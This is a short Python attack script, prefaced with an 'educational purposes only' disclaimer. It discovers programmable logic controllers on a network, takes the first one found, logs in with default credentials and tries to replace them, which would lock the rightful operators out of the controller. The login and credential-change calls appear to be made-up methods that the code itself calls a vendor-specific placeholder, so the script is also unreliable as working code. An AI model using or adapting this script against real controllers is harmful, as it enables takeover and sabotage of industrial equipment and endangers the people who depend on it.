# DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY.
# DO NOT USE FOR MALICIOUS INTENT. USING THIS SCRIPT WITHOUT AUTHORIZATION IS ILLEGAL.

from pycomm3 import CIPDriver, discover  # CIPDriver is used for communication with PLCs
import socket
import sys

def find_plc_ip():
    """
    Discover the PLC's IP address on the network using a CIP discovery broadcast.
    Returns the first discovered IP or None if no PLC is found.
    """
    print("Discovering PLCs on the network...")
    devices = discover()
    if not devices:
        print("No PLCs discovered on the network. Exiting...")
        return None

    # Assuming we are targeting the first device found on the network
    plc_device = devices[0]
    print(f"Found PLC: {plc_device['product_name']} at IP: {plc_device['ip_address']}")
    return plc_device['ip_address']

def change_plc_credentials(plc_ip, old_username, old_password, new_username, new_password):
    """
    Connect to the PLC and attempt to change its credentials.
    
    :param plc_ip: PLC's IP address
    :param old_username: Current username of the PLC
    :param old_password: Current password of the PLC
    :param new_username: New username to set on the PLC
    :param new_password: New password to set on the PLC
    """
    print(f"Connecting to PLC at {plc_ip}...")
    try:
        # Establish a connection to the PLC
        with CIPDriver(plc_ip) as plc:
            # Authenticate using old credentials
            if plc.login(username=old_username, password=old_password):
                print(f"Successfully authenticated with PLC at {plc_ip}")
                
                # Example Method Call: Changing Credentials (Vendor-Specific)
                # Modify based on your PLC's API or documentation
                success = plc.set_credentials(username=new_username, password=new_password)
                if success:
                    print(f"Credentials successfully changed to: {new_username}/{new_password}")
                else:
                    print("Failed to change credentials. Possible insufficient permissions or unsupported operation.")
            else:
                print(f"Authentication failed. Cannot access PLC at {plc_ip}")
    except Exception as e:
        print(f"Error occurred while communicating with the PLC: {str(e)}")

def main():
    # Find the PLC IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        sys.exit(1)

    # Define the current and new credentials
    old_username = "admin"  # Replace with actual current credentials for test device
    old_password = "password"  # Replace with actual current credentials for test device
    new_username = "new_admin"
    new_password = "new_password123"

    change_plc_credentials(plc_ip, old_username, old_password, new_username, new_password)

if __name__ == "__main__":
    main()